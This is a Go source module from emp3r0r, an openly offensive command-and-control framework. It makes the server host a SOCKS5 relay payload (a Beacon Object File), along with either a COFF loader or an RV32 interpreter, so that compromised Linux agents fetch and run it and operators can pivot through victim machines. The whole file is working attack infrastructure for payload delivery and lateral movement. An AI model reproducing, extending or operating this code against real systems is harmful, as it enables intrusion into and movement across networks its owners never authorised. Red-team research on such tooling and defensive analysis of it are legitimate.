package modules

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ModSocks5 is the relay BOF a C agent runs for one SOCKS5 CONNECT.
const ModSocks5 = "socks5"

// CanRunSocks5BOF reports whether target serves the pivot by running the socks5
// BOF. The Go agent has the relay built in; the C agent runs the BOF.
func CanRunSocks5BOF(target *def.Emp3r0rAgent) bool {
	if target == nil || !strings.EqualFold(target.GOOS, "linux") {
		return false
	}
	return strings.EqualFold(target.AgentImpl, "c")
}

// HostSocks5Relay makes the relay BOF and its loader downloadable by target.
//
// The C2 SOCKS5 listener sends `!proxy_start` to every agent. A Go agent
// answers with its built-in relay; a C agent fetches this BOF by its stable
// hosted name (`socks5.<arch>.gz`) when that command arrives, and the agent's
// command handler runs it. The operator's `socks_start` calls this, so the
// operator experience is identical for both agent kinds and the C2 server needs
// no module machinery: it only serves the file.
func HostSocks5Relay(target *def.Emp3r0rAgent) error {
	if !CanRunSocks5BOF(target) {
		return nil
	}
	ctx := &c2context.C2Context{Target: target}
	arch := agentArch(ctx)
	if arch == "" {
		return fmt.Errorf("cannot determine agent arch (GOArch=%q Arch=%q)", target.GOArch, target.Arch)
	}

	// x86-64 runs the native object through the BOF loader; every other arch
	// runs the RV32 guest through the interpreter.
	if arch == "amd64" {
		if _, err := ensureModuleDependencyHosted(ctx, "coffloader_linux"); err != nil {
			return fmt.Errorf("host the BOF loader: %w", err)
		}
		if _, err := ensureModuleDependencyHosted(ctx, ModSocks5); err != nil {
			return fmt.Errorf("host %s: %w", ModSocks5, err)
		}
		logging.Infof("%s: hosted the relay BOF and its loader for agent %s", ModSocks5, util.AgentRef(target.UUID))
		return nil
	}

	if _, err := ensureModuleDependencyHosted(ctx, "rvvm_linux"); err != nil {
		return fmt.Errorf("host the RV32 interpreter: %w", err)
	}
	config, ok := def.GetModule(ModSocks5)
	if !ok || config == nil || len(config.AgentConfig.Files) == 0 || config.Path == "" {
		return fmt.Errorf("module %s is not installed", ModSocks5)
	}
	rvFile := riscvPayloadPath(config.AgentConfig.Files[0])
	if !util.IsFileExist(filepath.Join(config.Path, rvFile)) {
		if err := buildRiscvPayload(config, nil); err != nil {
			return fmt.Errorf("build the RV32 relay: %w", err)
		}
	}
	hosted, err := hostModulePayload(config, rvFile, arch)
	if err != nil {
		return fmt.Errorf("host the RV32 relay: %w", err)
	}
	checksum := crypto.SHA256SumFile(filepath.Join(config.Path, rvFile))
	if checksum == "" {
		return fmt.Errorf("cannot hash %s", rvFile)
	}
	// The agent derives this name from the module and its own arch.
	if err := ftp.RegisterWWWDownload(filepath.Base(hosted), target.UUID, 0, checksum, false); err != nil {
		return fmt.Errorf("register the RV32 relay: %w", err)
	}
	logging.Infof("%s: hosted the RV32 relay and its interpreter for agent %s", ModSocks5, util.AgentRef(target.UUID))
	return nil
}
